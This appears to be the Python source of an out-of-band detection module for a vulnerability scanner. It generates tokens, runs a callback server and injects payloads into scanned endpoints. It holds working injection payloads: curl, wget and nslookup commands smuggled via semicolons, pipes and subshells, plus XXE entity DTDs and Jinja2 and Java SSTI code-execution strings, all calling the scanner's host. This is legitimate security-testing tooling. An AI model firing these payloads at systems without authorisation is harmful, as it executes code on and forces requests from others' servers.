"""
PHANTOM Out-of-Band (OOB) Detection Module

Detects blind vulnerabilities (SSRF, XXE, Command Injection, SSTI) via HTTP callbacks.
Tokens stored in Redis; lightweight HTTP server runs on port 9999 as a background asyncio task.
"""
import asyncio
import json
import logging
import os
import secrets
import time
from datetime import datetime
from typing import Optional

import redis as redis_lib
from aiohttp import web

from app.config import get_settings

logger = logging.getLogger("phantom.oob")

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
OOB_PORT = int(os.getenv("PHANTOM_OOB_PORT", "9999"))
OOB_HOST = os.getenv("PHANTOM_OOB_HOST", "")
OOB_DOMAIN = os.getenv("PHANTOM_OOB_DOMAIN", "")
TOKEN_TTL = 1800  # 30 minutes
REDIS_PREFIX = "phantom:oob:"

# Singleton server state
_server_task: Optional[asyncio.Task] = None
_server_runner: Optional[web.AppRunner] = None
_server_lock = asyncio.Lock()


def _get_redis():
    settings = get_settings()
    return redis_lib.from_url(settings.redis_url, decode_responses=True)


# ═══════════════════════════════════════════════════════════════════════════
# OOB Token Manager
# ═══════════════════════════════════════════════════════════════════════════

class OOBManager:
    """Manages OOB tokens and callback tracking via Redis."""

    def __init__(self):
        self._redis = _get_redis()
        self._oob_host = OOB_HOST
        self._oob_port = OOB_PORT

    # ------------------------------------------------------------------
    # Token lifecycle
    # ------------------------------------------------------------------

    def generate_token(self, scan_id: str, vuln_type: str, endpoint: str) -> str:
        """Create a unique OOB token and store metadata in Redis."""
        short_id = scan_id[:8] if scan_id else "0000"
        rand = secrets.token_hex(6)
        token = f"ph-{short_id}-{rand}"

        data = {
            "scan_id": scan_id,
            "vuln_type": vuln_type,
            "endpoint": endpoint,
            "created_at": datetime.utcnow().isoformat() + "Z",
            "triggered": False,
        }
        key = f"{REDIS_PREFIX}{token}"
        self._redis.setex(key, TOKEN_TTL, json.dumps(data))

        # Also add token to a per-scan set for fast lookup
        scan_key = f"{REDIS_PREFIX}scan:{scan_id}"
        self._redis.sadd(scan_key, token)
        self._redis.expire(scan_key, TOKEN_TTL)

        return token

    def get_callback_url(self, token: str) -> str:
        """Return the HTTP callback URL for this token."""
        return f"http://{self._oob_host}:{self._oob_port}/cb/{token}"

    def get_dns_hostname(self, token: str) -> str:
        """Return a DNS hostname for DNS-based OOB (informational only)."""
        domain = OOB_DOMAIN or self._oob_host
        return f"{token}.{domain}"

    def record_callback(self, token: str, source_ip: str, request_data: dict) -> bool:
        """Mark a token as triggered. Returns True if token existed."""
        key = f"{REDIS_PREFIX}{token}"
        raw = self._redis.get(key)
        if not raw:
            return False

        data = json.loads(raw)
        data["triggered"] = True
        data["callback_at"] = datetime.utcnow().isoformat() + "Z"
        data["source_ip"] = source_ip
        data["request_data"] = request_data
        # Keep TTL but update value
        ttl = self._redis.ttl(key)
        if ttl and ttl > 0:
            self._redis.setex(key, ttl, json.dumps(data))
        else:
            self._redis.setex(key, TOKEN_TTL, json.dumps(data))

        logger.info(f"OOB callback received: token={token} type={data.get('vuln_type')} from={source_ip}")
        return True

    def check_callbacks(self, scan_id: str) -> list[dict]:
        """Return all triggered tokens for a given scan."""
        scan_key = f"{REDIS_PREFIX}scan:{scan_id}"
        tokens = self._redis.smembers(scan_key)
        triggered = []

        for token in tokens:
            key = f"{REDIS_PREFIX}{token}"
            raw = self._redis.get(key)
            if not raw:
                continue
            data = json.loads(raw)
            if data.get("triggered"):
                data["token"] = token
                triggered.append(data)

        return triggered

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    def generate_oob_payloads(self, token: str, vuln_type: str) -> list[dict]:
        """Generate OOB payloads for a specific vuln type."""
        cb_url = self.get_callback_url(token)
        dns_host = self.get_dns_hostname(token)
        payloads = []

        if vuln_type == "ssrf":
            payloads = [
                {
                    "vuln_type": "ssrf",
                    "payload": cb_url,
                    "oob_token": token,
                    "oob": True,
                    "description": "SSRF: Direct HTTP callback",
                },
                {
                    "vuln_type": "ssrf",
                    "payload": f"http://{self._oob_host}:{self._oob_port}/cb/{token}",
                    "oob_token": token,
                    "oob": True,
                    "description": "SSRF: HTTP callback (IP-based)",
                },
            ]

        elif vuln_type == "xxe":
            xxe_dtd = (
                f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{cb_url}">]>'
                f"\n<foo>&xxe;</foo>"
            )
            xxe_param = (
                f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{cb_url}"> %xxe;]>'
                f"\n<foo>test</foo>"
            )
            payloads = [
                {
                    "vuln_type": "xxe",
                    "payload": xxe_dtd,
                    "oob_token": token,
                    "oob": True,
                    "description": "XXE: External entity with HTTP callback",
                },
                {
                    "vuln_type": "xxe",
                    "payload": xxe_param,
                    "oob_token": token,
                    "oob": True,
                    "description": "XXE: Parameter entity with HTTP callback",
                },
            ]

        elif vuln_type == "cmd_injection":
            payloads = [
                {
                    "vuln_type": "cmd_injection",
                    "payload": f"; curl {cb_url} ;",
                    "oob_token": token,
                    "oob": True,
                    "description": "CMD: curl callback (semicolon)",
                },
                {
                    "vuln_type": "cmd_injection",
                    "payload": f"| curl {cb_url}",
                    "oob_token": token,
                    "oob": True,
                    "description": "CMD: curl callback (pipe)",
                },
                {
                    "vuln_type": "cmd_injection",
                    "payload": f"$(curl {cb_url})",
                    "oob_token": token,
                    "oob": True,
                    "description": "CMD: curl callback (subshell)",
                },
                {
                    "vuln_type": "cmd_injection",
                    "payload": f"; wget -q -O /dev/null {cb_url} ;",
                    "oob_token": token,
                    "oob": True,
                    "description": "CMD: wget callback",
                },
                {
                    "vuln_type": "cmd_injection",
                    "payload": f"; nslookup {dns_host} ;",
                    "oob_token": token,
                    "oob": True,
                    "description": "CMD: nslookup DNS callback",
                },
            ]

        elif vuln_type == "ssti":
            payloads = [
                {
                    "vuln_type": "ssti",
                    "payload": (
                        "{{request.application.__globals__.__builtins__"
                        f".__import__('urllib.request').urlopen('{cb_url}')}}}}"
                    ),
                    "oob_token": token,
                    "oob": True,
                    "description": "SSTI: Jinja2 urllib callback",
                },
                {
                    "vuln_type": "ssti",
                    "payload": (
                        "${T(java.lang.Runtime).getRuntime()"
                        f".exec('curl {cb_url}')}}"
                    ),
                    "oob_token": token,
                    "oob": True,
                    "description": "SSTI: Java/Spring expression callback",
                },
            ]

        return payloads


# ═══════════════════════════════════════════════════════════════════════════
# HTTP Callback Server (aiohttp)
# ═══════════════════════════════════════════════════════════════════════════

async def _handle_callback(request: web.Request) -> web.Response:
    """Handle incoming OOB callback — any HTTP method."""
    token = request.match_info.get("token", "")
    if not token:
        return web.Response(status=200)

    # Collect request data
    body = ""
    try:
        body = (await request.read()).decode("utf-8", errors="replace")[:2000]
    except Exception:
        pass

    request_data = {
        "method": request.method,
        "path": str(request.path),
        "headers": dict(request.headers),
        "body": body,
        "query": dict(request.query),
    }

    source_ip = request.remote or "unknown"

    mgr = OOBManager()
    mgr.record_callback(token, source_ip, request_data)

    # Return empty 200 — don't reveal anything
    return web.Response(status=200)


def _build_app() -> web.Application:
    """Build the aiohttp application for the OOB callback server."""
    app = web.Application()
    # Accept any method on /cb/{token}
    for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]:
        app.router.add_route(method, "/cb/{token}", _handle_callback)
        app.router.add_route(method, "/dns/{token}", _handle_callback)
    return app


async def start_oob_server():
    """Start the OOB HTTP server as a background asyncio task (idempotent)."""
    global _server_task, _server_runner

    if not OOB_HOST:
        logger.warning("OOB detection disabled: no public host configured (set PHANTOM_OOB_HOST)")
        return

    async with _server_lock:
        if _server_task and not _server_task.done():
            return  # Already running

        app = _build_app()
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", OOB_PORT)
        await site.start()
        _server_runner = runner
        logger.info(f"OOB callback server started on 0.0.0.0:{OOB_PORT}")


async def stop_oob_server():
    """Stop the OOB callback server."""
    global _server_runner

    async with _server_lock:
        if _server_runner:
            await _server_runner.cleanup()
            _server_runner = None
            logger.info("OOB callback server stopped")


# ═══════════════════════════════════════════════════════════════════════════
# Pipeline integration helpers
# ═══════════════════════════════════════════════════════════════════════════

async def inject_oob_payloads(context: dict, db=None):
    """Add OOB payloads to scan context for blind vulnerability detection.

    Called after payload_gen phase. Adds payloads for SSRF, XXE,
    command injection, and SSTI to context["oob_payloads"].
    Also starts the OOB server if not already running.
    """
    if not OOB_HOST:
        logger.info("OOB detection disabled: no public host configured")
        return

    # Start server lazily
    await start_oob_server()

    mgr = OOBManager()
    scan_id = context.get("scan_id", "unknown")
    endpoints = context.get("endpoints", [])[:20]  # Limit to first 20
    vuln_types = ["ssrf", "xxe", "cmd_injection", "ssti"]
    total = 0

    for ep in endpoints:
        ep_url = ep.get("url", "") if isinstance(ep, dict) else str(ep)
        for vtype in vuln_types:
            token = mgr.generate_token(scan_id, vtype, ep_url)
            payloads = mgr.generate_oob_payloads(token, vtype)
            context.setdefault("oob_payloads", []).extend(payloads)
            # Also add to main payloads list so exploiter picks them up
            context.setdefault("payloads", []).extend(payloads)
            total += len(payloads)

    logger.info(f"Injected {total} OOB payloads for {len(endpoints)} endpoints")
    return total


async def check_oob_results(scan_id: str, db=None) -> list[dict]:
    """Check if any OOB callbacks were received for this scan.

    Returns list of confirmed blind vulnerabilities with details.
    """
    if not OOB_HOST:
        return []

    mgr = OOBManager()
    triggered = mgr.check_callbacks(scan_id)

    results = []
    for t in triggered:
        vuln_type = t.get("vuln_type", "ssrf")
        # Map to VulnType enum values
        vtype_map = {
            "ssrf": "ssrf",
            "xxe": "xxe",
            "cmd_injection": "cmd_injection",
            "ssti": "ssti",
        }
        results.append({
            "vuln_type": vtype_map.get(vuln_type, vuln_type),
            "title": f"Blind {vuln_type.upper()} confirmed via OOB callback",
            "url": t.get("endpoint", ""),
            "severity": "high" if vuln_type in ("cmd_injection", "ssti", "xxe") else "high",
            "description": (
                f"Out-of-band callback received confirming blind {vuln_type.upper()}. "
                f"Callback from {t.get('source_ip', 'unknown')} "
                f"at {t.get('callback_at', 'unknown')}."
            ),
            "evidence": {
                "oob_token": t.get("token"),
                "callback_at": t.get("callback_at"),
                "source_ip": t.get("source_ip"),
                "request_method": (t.get("request_data") or {}).get("method"),
            },
            "oob_confirmed": True,
            "ai_confidence": 0.95,
        })

    if results:
        logger.info(f"OOB check: {len(results)} blind vulns confirmed for scan {scan_id}")

    return results
